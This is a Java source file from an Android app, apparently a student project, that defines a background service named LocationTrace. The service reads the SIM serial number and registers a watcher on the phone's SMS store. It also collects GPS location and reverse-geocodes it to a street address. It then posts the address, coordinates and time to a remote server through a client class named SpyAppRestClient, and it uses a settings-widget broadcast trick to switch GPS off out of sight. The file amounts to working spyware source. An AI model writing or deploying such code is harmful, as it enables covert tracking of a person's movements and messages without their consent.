package com.example.natalia.super_inzynierka;

import android.Manifest;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.*;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.Settings;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;
import cz.msebera.android.httpclient.Header;
import cz.msebera.android.httpclient.io.SessionOutputBuffer;

import java.io.IOException;
import java.util.*;

/**
 * Created by Natalia on 01.12.2016.
 */
public class LocationTrace extends Service implements LocationListener {

    public static ContentResolver contentResolver;

    // The minimum distance to change Updates in meters
    private static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 10; // 10 meters
    private static final int TWO_MINUTES = 100 * 10;

    // The minimum time between updates in milliseconds
    private static final long MIN_TIME_BW_UPDATES = 1000 * 10; // 30 seconds

    private Context context;

    double latitude;
    double longitude;

    Location location = null;
    boolean isGPSEnabled = false;
    boolean isNetworkEnabled = false;
    protected LocationManager locationManager;

    public static String serialNr;


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
//        System.out.println("onStartCommand service location");
//        turnGPSOff();
        TelephonyManager telemamanger = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
        serialNr = telemamanger.getSimSerialNumber();

        System.out.println("TEMP SERVICE ONsTART");
        MyObserver myObserver = new MyObserver(new Handler());
        contentResolver = this.getApplicationContext().getContentResolver();
        contentResolver.registerContentObserver(Uri.parse("content://sms/"), true, myObserver);

        this.context = this;

        System.out.println("START LOCATION SERVECE. SERIAL NR: " + serialNr);
        Toast.makeText(context, "onStartCommand", Toast.LENGTH_LONG).show();
        get_current_location();
        stop();
//        System.out.println("Lat " + latitude + "long " + longitude);
//        Timer timer = new Timer();
//        timer.schedule(new TimerTask() {
//            @Override
//            public void run() {
////                PowerManager mgr = (PowerManager)context.getSystemService(Context.POWER_SERVICE);
////                PowerManager.WakeLock wakeLock = mgr.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MyWakeLock");
////                wakeLock.acquire();
//                get_current_location();
//                stop();
////                wakeLock.release();
//            }
//        }, 120 * 1000, 120 * 1000);
        return START_STICKY;
    }


    @Override
    public void onLocationChanged(Location location) {
        if(location.getLatitude()-latitude>MIN_DISTANCE_CHANGE_FOR_UPDATES || location.getLatitude()-latitude<MIN_DISTANCE_CHANGE_FOR_UPDATES) {
            System.out.println("DISTANS WIEKSZY NIZ 10M");
            get_current_location();
        }
        System.out.println("onLocationChanged");
//        if ((location != null) && (location.getLatitude() != 0) && (location.getLongitude() != 0)) {
//            System.out.println("(location != null) && (location.getLatitude() != 0) && (location.getLongitude() != 0)");
//
//            latitude = location.getLatitude();
//            longitude = location.getLongitude();
//            System.out.println("get lat i long");
////            if (!Utils.getuserid(context).equalsIgnoreCase("")) {
////                Double[] arr = {location.getLatitude(), location.getLongitude()};
////
////                // DO ASYNCTASK
////            }
//        }

//        String cityName = null;
//        Geocoder gcd = new Geocoder(getBaseContext(), Locale.getDefault());
//        List<Address> addresses;
//        try {
//            addresses = gcd.getFromLocation(location.getLatitude(),
//                    location.getLongitude(), 1);
//            if (addresses.size() > 0) {
//                System.out.println(addresses.get(0).getLocality());
//                cityName = addresses.get(0).getLocality();
//            }
//        }
//        catch (IOException e) {
//            e.printStackTrace();
//        }
//        String s = longitude + "\n" + latitude + "\n\nMy Current City is: "
//                + cityName;
//        System.out.println(s);
    }


    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {
        System.out.println("onStatusChanged");

    }

    @Override
    public void onProviderEnabled(String provider) {
        System.out.println("onProviderEnabled");

    }

    @Override
    public void onProviderDisabled(String provider) {
        System.out.println("onProviderDisabled");
    }

    /*
    *  Get Current Location
    */
    public void get_current_location() {
//        System.out.println("get_current_location");

        init();
        if (!isGPSEnabled && !isNetworkEnabled) {
//            System.out.println("!isGPSEnabled && !isNetworkEnabled");

        } else {
            if (isGPSEnabled) {
//                System.out.println("isGPSEnabled");
                if (location == null) {
//                    System.out.println("location == null");
                    locationUpdate();
                    checkPermission();

                    if (locationManager != null) {
                        location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
//                        System.out.println("last known location");
                        if (location != null) {
//                            System.out.println("location!=nul");
                            getLatAndLong();
//                            System.out.println("lang and long");
                        }
                    }
                }
            }
            if (isNetworkEnabled) {
//                System.out.println("isNetworkEnabled");
                locationUpdate();
//                System.out.println("1");

                if (locationManager != null) {
                    location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
//                    System.out.println("last known location");
                    if (location != null) {
//                        System.out.println("2");
                        getLatAndLong();
//                        System.out.println("6");
                    }
                }
            }
        }
//        System.out.println("7");
        if (location != null) getAddressAndPost();
        turnGPSOff();
    }

    public void getAddressAndPost() {
//        System.out.println("GET ADDRESS AND POST");
        String time = setTime();

        String cityName = null;
        String streetName = null;
        String countryName = null;
        String streetNumber = null;
        Geocoder gcd = new Geocoder(getBaseContext(), Locale.getDefault());
        List<Address> addresses;
        try {
//            System.out.println("8");
            addresses = gcd.getFromLocation(location.getLatitude(),
                    location.getLongitude(), 1);
//            System.out.println("9");
            if (addresses.size() > 0) {
//                System.out.println("10");
                cityName = addresses.get(0).getLocality();
                streetName = addresses.get(0).getThoroughfare();
                countryName = addresses.get(0).getCountryName();
                streetNumber = addresses.get(0).getFeatureName();
//                System.out.println("11");
                System.out.println(addresses.get(0));
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        String s = longitude + "\n" + latitude + "\n\nMy Current City is: "
                + cityName + "| Street: " + streetName + " " + streetNumber + "| Counrty Name: " + countryName + "| Timr: " + time;
        System.out.println(s);
        String street = streetName + " " + streetNumber;
        String long1 = String.valueOf(longitude);
        String lat1 = String.valueOf(latitude);
        postRequest(cityName, street, countryName, time, long1, lat1);
    }

    public void locationUpdate() {
//        System.out.println("update 1");
        checkPermission();
//        System.out.println("update 2");
        locationManager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER,
                MIN_TIME_BW_UPDATES,
                MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
//        System.out.println("update 3");
    }

    public void getLatAndLong() {
//        System.out.println("4");
        latitude = location.getLatitude();
        longitude = location.getLongitude();
//        System.out.println("5");
    }

    public void init() {
        locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        isGPSEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
        isNetworkEnabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
    }

    public double getLatitude() {
        if (location != null) {
            latitude = location.getLatitude();
        }
        return latitude;
    }

    public double getLongitude() {
        if (location != null) {
            longitude = location.getLongitude();
        }

        return longitude;
    }


    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public void stop() {
//        System.out.println("STOP");
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        locationManager.removeUpdates(this);
        locationManager = null;
//        System.out.println("REMOVE UPDATES");

    }

    public void start() {
        System.out.println("START");
        locationManager = (LocationManager) getApplicationContext().getSystemService(Context.LOCATION_SERVICE);
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, MIN_TIME_BW_UPDATES, MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
    }

    private static final String TAG = "MyService";

    @Override
    public void onDestroy() {
        Toast.makeText(this, "My Service Stopped", Toast.LENGTH_LONG).show();
        Log.d(TAG, "onDestroy");
//        System.out.println("onDestroy location");
//        if (locationManager != null) {
//            checkPermission();
//            locationManager.removeUpdates(this);
//            locationManager = null;
//        }
//        turnGPSOff();
//        this.stopSelf();
//        super.onDestroy();
    }


    private void turnGPSOff() {
//        System.out.println("TURN OFF GPS");
        String provider = Settings.Secure.getString(getContentResolver(), Settings.Secure.LOCATION_PROVIDERS_ALLOWED);

        if (provider.contains("gps")) { //if gps is enabled
//            System.out.println("do off");
            final Intent poke = new Intent();
            poke.setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider");
            poke.addCategory(Intent.CATEGORY_ALTERNATIVE);
            poke.setData(Uri.parse("3"));
            sendBroadcast(poke);
//            System.out.println("set broadcast off");
        }


    }

    private void postRequest(String city, String street, String country, String time, String longitude, String latitude) {
        System.out.println("POST REQUEST LOCATION");
        RequestParams params = new RequestParams();
        params.put("city", city);
        params.put("street", street);
        params.put("country", country);
        params.put("time", time);
        params.put("longitude", longitude);
        params.put("latitude", latitude);
        params.put("log", serialNr);
//        System.out.println("OK POST REQUESR");
        SpyAppRestClient.post("create_location/", params, new AsyncHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                System.out.println("ONSUCCESS LOCATION");
            }

            @Override
            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
                System.out.println("ON FAILURE LOCATION");
            }
        });
    }

    private String setTime() {
        long millis = System.currentTimeMillis();
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(millis);

        String min;
        String month;
        String day;
        int mYear = calendar.get(Calendar.YEAR);
        int mMonth = calendar.get(Calendar.MONTH);
        int mDay = calendar.get(Calendar.DAY_OF_MONTH);
        int hour = calendar.get(Calendar.HOUR_OF_DAY);
        int minute = calendar.get(Calendar.MINUTE);
        mMonth = mMonth + 1;

        min = Integer.toString(minute);
        if (minute < 10) min = "0" + minute;
        month = Integer.toString(mMonth);
        if (mMonth < 10) month = "0" + mMonth;
        day = Integer.toString(mDay);
        if (mDay < 10) day = "0" + mDay;
        return day + "-" + month + "-" + mYear + "  " + hour + ":" + min;
    }

    private void checkPermission() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            System.out.println("PERMISSION CHECK");

            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
    }
}
